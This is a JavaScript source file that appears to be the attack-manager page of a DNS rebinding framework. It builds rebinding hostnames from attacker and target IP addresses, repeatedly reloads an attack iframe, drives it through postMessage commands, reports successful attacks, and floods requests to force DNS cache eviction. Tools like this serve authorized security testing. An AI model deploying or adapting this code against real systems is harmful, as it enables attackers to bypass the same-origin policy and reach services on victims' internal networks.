/* Attack Management */

let count = 0;
let errorCount = 0;
let timerAttackFrameOne;
let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";

window.addEventListener("message", function (msg) {
    console.log("Message received from", msg.origin, msg.data.status);

    if (msg.data.status == "start") {
        console.log("iframe reports that attack has started");
        if (msg.origin == document.getElementById("attackframeone").src.substr(0, msg.origin.length))
            clearInterval(timerAttackFrameOne);
        msg.source.postMessage({
            cmd: "interval",
            param: document.getElementById("interval").value
        }, "*");
        msg.source.postMessage({
            cmd: "indextoken",
            param: document.getElementById("indextoken").value
        }, "*");
        msg.source.postMessage({
            cmd: "start",
            param: null
        }, "*");
    }
    if (msg.data.status == "success") {
        console.log("IFrame reports attack successful", msg.data.response);

        msg.source.postMessage({
            cmd: "stop"
        }, "*");

        alert("Attack Successful: " + document.domain + " " + msg.data.response);
    }

    // Possibly a firewalled or closed port. Possibly a non-HTTP service.
    if (msg.data.status == "error") {
        errorCount += 1;
        console.log("error");

        if (errorCount == 5) {
            attackframeone.contentWindow.postMessage({
                cmd: "stop"
            }, "*");
            alert("Too many errors");
        }
    }


});

function reloadAttackFrameOne() {

    document.getElementById("attackframeone").src = hosturl
        .replace("%1", document.getElementById("attackhostipaddress").value)
        .replace("%2", document.getElementById("targethostipaddress").value)
        .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
        .replace("%4", "")
        .replace("%5", document.getElementById("attackhostdomain").value)
        .replace("%6", document.getElementById("targetport").value)
        .replace("%7", document.getElementById("payloads").value) +
        "?rnd=" + Math.random();
}

function checkPayload() {
    const payloadsElement = document.getElementById('payloads');
    for (let p of config.attackPayloads) {
        if (payloadsElement.value === p.name) {
            return true
        }
    }
    return false;
}

function begin() {
    if (!checkPayload()) {
        alert("Please select an attack payload first.");
        return;
    }
    message.className = "d-block";
    start.disabled = true;
    errorCount = 0;
    timerAttackFrameOne = setInterval(reloadAttackFrameOne, parseInt(document.getElementById("interval").value) * 1000);
    reloadAttackFrameOne();
}

function toggle() {
    if (advanced.className === "d-block") {
        advanced.className = "d-none"
    } else {
        advanced.className = "d-block"
    }

}

function requestPort() {
    putData('/servers', {
            "Port": document.getElementById("targetport").value
        })
        .then(function (data) {
            getHTTPServersConfig().then(function (HTTPServersConfig) {
                document.getElementById("listenports").textContent = HTTPServersConfig.ports;
                document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
            })
        })
        .catch(error => console.error(error))
}

function getHTTPServersConfig() {
    let ports = [];
    return fetch('/servers')
        .then(function (response) {
            return response.json();
        })
        .then(function (myJsonConfig) {

            for (let e of myJsonConfig.ServerInformation) {
                ports.push(e.Port);
            }
            promise = new Promise((resolve, reject) => {
                resolve({
                    ports: ports,
                    AllowDynamicHTTPServers: myJsonConfig.AllowDynamicHTTPServers
                });
            })
            return promise;
        })
}

function putData(url, data) {
    // Default options are marked with *
    return fetch(url, {
            body: JSON.stringify(data),
            method: 'PUT',
        })
        .then(response => response.json())
}


function forceCacheEviction() {
    for (i = 0; i < 1000; i++) {
        url = hosturl
            .replace("%1", document.getElementById("attackhostipaddress").value)
            .replace("%2", document.getElementById("targethostipaddress").value)
            .replace("%3", "none")
            .replace("%4", "cacheeviction" + (Number(0x0 + i).toString(16)))
            .replace("%5", document.getElementById("attackhostdomain").value)
            .replace("%6", document.getElementById("dummyport").value)
            .replace("%7", document.getElementById("payloads").value) +
            "?rnd=" + Math.random();
        fetch(url).catch(error => error);
    }
}

/* UI Stuff */

function getPayloads() {
    payloadsElement = document.getElementById('payloads');
    fetch('/manager-config.json')
        .then(function (r) {
            return r.text()
        })
        .then(function (d) {
            config = JSON.parse(d);
            for (let p of config.attackPayloads) {
                var option = document.createElement('option');
                option.value = p.name;
                port = '';
                if (p.ports != "") {
                    port = ' (default port ' + p.ports + ')';
                }
                option.text  = p.name + port;
                payloadsElement.add(option, 0);
            }
            document.getElementById('attackhostdomain').value = config.attackHostDomain;
            document.getElementById('attackhostipaddress').value = config.attackHostIPAddress;
            document.getElementById('targethostipaddress').value = config.targetHostIPAddress;
            document.getElementById('dummyport').value = config.dummyPort;
            document.getElementById('indextoken').value = config.indexToken;
            document.getElementById('interval').value = config.interval;
        })
}

document.addEventListener("DOMContentLoaded", function (event) {
    getHTTPServersConfig().then(function (HTTPServersConfig) {
        document.getElementById("listenports").textContent = HTTPServersConfig.ports;
        document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
        document.getElementById("requestport").disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
    })

    getPayloads();
});
